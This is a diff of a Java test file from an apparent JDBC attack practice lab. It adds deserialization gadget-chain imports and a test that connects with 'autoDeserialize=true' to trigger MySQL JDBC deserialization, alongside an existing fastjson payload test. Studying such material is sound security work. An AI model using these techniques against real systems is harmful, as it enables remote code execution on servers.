@@ -1,8 +1,20 @@
 package com.endlessshw.jdbc_range;
 
 import com.alibaba.fastjson.JSON;
+import com.fasterxml.jackson.databind.node.POJONode;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.CtMethod;
 import org.junit.jupiter.api.Test;
+import org.springframework.aop.framework.AdvisedSupport;
 
+import javax.management.BadAttributeValueExpException;
+import javax.xml.transform.Templates;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
 import java.sql.Connection;
 import java.sql.DriverManager;
 import java.util.Properties;
@@ -56,5 +68,17 @@ public class JDBCTest {
                 "\t\t}\n" +
                 "\t}\n";
         JSON.parseObject(payload);
+    }
+
+    @Test
+    public void testJacksonChain_stable() throws Exception {
+        String CLASS_NAME = "com.mysql.jdbc.Driver";
+        String URL        = "jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true";
+        String USERNAME   = "Jackson";
+        // String PASSWORD   = "123456";
+
+        Class.forName(CLASS_NAME);
+        Connection connection = DriverManager.getConnection(URL, USERNAME, "");
+        connection.close();
     }
 }
